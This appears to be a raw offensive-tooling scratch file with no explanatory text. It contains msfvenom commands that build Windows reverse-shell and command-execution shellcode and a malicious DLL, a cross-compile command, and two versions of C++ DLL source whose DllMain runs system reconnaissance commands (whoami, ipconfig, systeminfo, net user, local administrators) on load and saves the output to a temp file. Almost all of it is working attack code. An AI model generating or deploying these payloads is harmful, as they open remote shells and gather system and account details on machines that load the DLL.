msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_LAB_IP LPORT=443 -f raw -o shellcode.bin -b '\x00'

msfvenom -p windows/x64/exec CMD=calc.exe -f c -b '\x00' | grep -o '\\x[0-9a-fA-F]\{2\}' | tr -d '\n'


msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_LAB_IP LPORT=443 -f c -b '\x00' | grep -o '\\x[0-9a-fA-F]\{2\}' | tr -d '\n'

msfvenom -p windows/x64/exec CMD="cmd.exe /c \"whoami > %TEMP%\\p3_recon.txt & hostname >> %TEMP%\\p3_recon.txt & ipconfig /all >> %TEMP%\\p3_recon.txt & systeminfo >> %TEMP%\\p3_recon.txt & net user >> %TEMP%\\p3_recon.txt & net localgroup administrators >> %TEMP%\\p3_recon.txt\"" -f dll -o exploratory.dll


x86_64-w64-mingw32-g++ -shared -o exploratory.dll exploratory.cpp

#include <windows.h>
#include <stdio.h>

void RunRecon() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    strcat_s(tempPath, "p3_recon.txt");

    FILE* f = nullptr;
    fopen_s(&f, tempPath, "w");
    if (!f) return;

    fprintf(f, "=== P3 DLL Recon Results ===\n\n");

    // Basic recon commands
    system("whoami >> %TEMP%\\p3_recon.txt");
    system("hostname >> %TEMP%\\p3_recon.txt");
    system("ipconfig /all >> %TEMP%\\p3_recon.txt");
    system("systeminfo >> %TEMP%\\p3_recon.txt");
    system("net user >> %TEMP%\\p3_recon.txt");
    system("net localgroup administrators >> %TEMP%\\p3_recon.txt");

    fprintf(f, "\n=== Recon Completed ===\n");
    fclose(f);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        RunRecon();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}











#include <windows.h>
#include <stdio.h>
#include <string.h>

void RunRecon() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    strcat(tempPath, "p3_recon.txt");

    FILE* f = fopen(tempPath, "w");
    if (!f) return;

    fprintf(f, "=== P3 DLL Recon Results ===\n\n");
    fclose(f);

    // Run exploratory commands and append to the file
    system("whoami >> %TEMP%\\p3_recon.txt");
    system("hostname >> %TEMP%\\p3_recon.txt");
    system("ipconfig /all >> %TEMP%\\p3_recon.txt");
    system("systeminfo >> %TEMP%\\p3_recon.txt");
    system("net user >> %TEMP%\\p3_recon.txt");
    system("net localgroup administrators >> %TEMP%\\p3_recon.txt");
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        RunRecon();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
